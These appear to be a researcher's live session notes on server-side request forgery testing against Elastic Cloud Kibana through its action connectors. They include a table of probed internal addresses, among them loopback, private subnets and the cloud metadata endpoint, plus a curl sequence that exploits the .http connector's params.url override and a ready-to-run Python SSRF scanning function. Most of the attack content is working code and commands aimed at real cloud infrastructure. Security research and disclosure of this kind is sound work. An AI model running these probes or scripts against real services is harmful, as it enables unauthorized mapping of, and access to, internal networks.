# Connector SSRF Testing — Live Session Notes

## Environment
- Target: cloud.elastic.co (Kibana 9.4.2, traditional flavor, not serverless)
- Access: API key from Stack Management → API Keys
- Base URL: `https://<deployment-id>.us-central1.gcp.cloud.es.io`
- Auth header: `Authorization: ApiKey <base64-key>`

## Connector Types Available on Cloud
Standard connectors: `.email`, `.index`, `.pagerduty`, `.swimlane`, `.server-log`, `.slack`, `.slack_api`, `.webhook`, `.http`, `.cases-webhook`, `.xmatters`, `.servicenow`, `.servicenow-sir`, `.servicenow-itom`, `.jira`, `.teams`, `.torq`, `.opsgenie`, `.jira-service-management`, `.tines`, `.gen-ai`, `.bedrock`, `.gemini`, `.d3security`, `.resilient`, `.thehive`, `.xsoar`, `.mcp`, `.sentinelone`, `.crowdstrike`, `.inference`, `.microsoft_defender_endpoint`, `.abuseipdb`, `.alienvault-otx`, `.jira-cloud`, `.confluence-cloud`, `.aws_lambda`, `.brave-search`, `.figma`, `.github`

## SSRF Test Results

| Target | Error | Interpretation |
|--------|-------|----------------|
| `127.0.0.1:5601` | ECONNREFUSED | Nothing listening on localhost. K8s sidecar pattern |
| `127.0.0.1:9200` | ECONNREFUSED | ES not on localhost |
| `127.0.0.1:3000` | ECONNREFUSED | No Node dev server |
| `127.0.0.1:443` | ECONNREFUSED | No local HTTPS |
| `127.0.0.1:8443` | ECONNREFUSED | No local HTTPS |
| `127.0.0.1:9443` | ECONNREFUSED | No local HTTPS |
| `kibana:5601` | ENOTFOUND | DNS fails — no K8s DNS |
| `elasticsearch:9200` | ENOTFOUND | DNS fails |
| `es:9200` | ENOTFOUND | DNS fails |
| `10.0.0.1:5601` | ETIMEDOUT (60s) | Routable but firewalled/filtered |
| `10.0.1:9200` | ETIMEDOUT (60s) | Routable but no response |
| `172.17.0.1:5601` | ETIMEDOUT | Docker bridge reachable but filtered |
| `169.254.169.254:80` | EHOSTUNREACH | GCP metadata firewalled at hypervisor |
| `metadata.google.internal:80` | EHOSTUNREACH | GCP metadata DNS resolves but blocked |
| `https://base:9243/` | HTTP 302 (w/ApiKey) | Not ES — just Kibana responding on alt port |

## HTTP Connector (`.http`) URL Override Finding

The `.http` connector (Workflows-specific, system connector type) has a critical design difference: **`params.url` overrides `config.url` at execution time.**

```bash
# Create .http connector with a legitimate URL
CID=$(curl -s "$BASE/api/actions/connector" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{
    "name": "http-override",
    "connector_type_id": ".http",
    "secrets": {},
    "config": {"url": "https://example.com/"}
  }' | python3 -c "import sys,json;print(json.load(sys.stdin).get('id',''))")

# Execute with params.url OVERRIDING config.url to internal target
curl -s "$BASE/api/actions/connector/$CID/_execute" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"params": {"method": "GET", "url": "http://10.0.0.1:9200/"}}'

# This bypasses any per-connector URL restrictions since the override
# happens AFTER config validation. Only the actions plugin's global
# allowlist (xpack.actions.allowedHosts) applies at execution time.
```

Source code path: `x-pack/platform/plugins/shared/stack_connectors/server/connector_types/http/http_connector.ts`:
- Line 160-162: `params.url` rendered via Mustache templates
- Line 306: `const baseUrl = params.url || config.url;`

## Always Clean Up Test Connectors

Test connectors clutter the deployment and are visible to other users. Always delete after each probe:

```bash
curl -s -X DELETE "$BASE/api/actions/connector/$CID" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"
```

Batch cleanup pattern:
```bash
for CID in $(curl -s "$BASE/api/actions/connectors" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true" \
  | python3 -c "
import sys,json
for c in json.load(sys.stdin):
    if 'ssrf' in c.get('name','') or 'test' in c.get('name','') or 'scan' in c.get('name',''):
        print(c['id'])
"); do
  curl -s -X DELETE "$BASE/api/actions/connector/$CID" \
    -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"
done
```

## Key Discovery
**No host allowlist restriction on cloud.elastic.co.** Webhook connectors can be created pointing to ANY internal IP address — `127.0.0.1`, `10.0.0.1`, `172.17.0.1`, private subnets. All create successfully. The `xpack.actions.allowedHosts` config is effectively `['*']`.

## Cloud Deployment Architecture Inferences
- Kibana and ES run in separate containers (or at least different network namespaces)
- No K8s DNS (single-name hostnames fail)
- GCP metadata endpoint is firewalled at hypervisor level (common for GCP K8s)
- Internal 10.x.x.x subnet is routable but port-filtered
- Kibana is behind an HTTPS reverse proxy that terminates TLS

## Scanning Script (Python)

```python
import requests, json, time

KEY = open('/path/to/api-key').read().strip()
BASE = "https://your-deployment.cloud.es.io"
HEADERS = {"Authorization": f"ApiKey {KEY}", "kbn-xsrf": "true"}

def ssrf_scan(target_url):
    # Create
    r = requests.post(f"{BASE}/api/actions/connector",
        headers=HEADERS, json={
            "name": f"scan-{int(time.time())}",
            "connector_type_id": ".webhook",
            "secrets": {},
            "config": {"url": target_url, "method": "get", "hasAuth": False}
        })
    cid = r.json().get("id")
    if not cid:
        return f"CREATE_FAILED: {r.text[:200]}"
    
    # Execute
    r = requests.post(f"{BASE}/api/actions/connector/{cid}/_execute",
        headers=HEADERS, json={"params": {}})
    
    # Cleanup
    requests.delete(f"{BASE}/api/actions/connector/{cid}", headers=HEADERS)
    
    result = r.json()
    if result.get("status") == "ok":
        return f"SUCCESS: {result.get('data', '')[:200]}"
    msg = result.get("service_message", "") or result.get("message", "")
    return msg[:120]
```
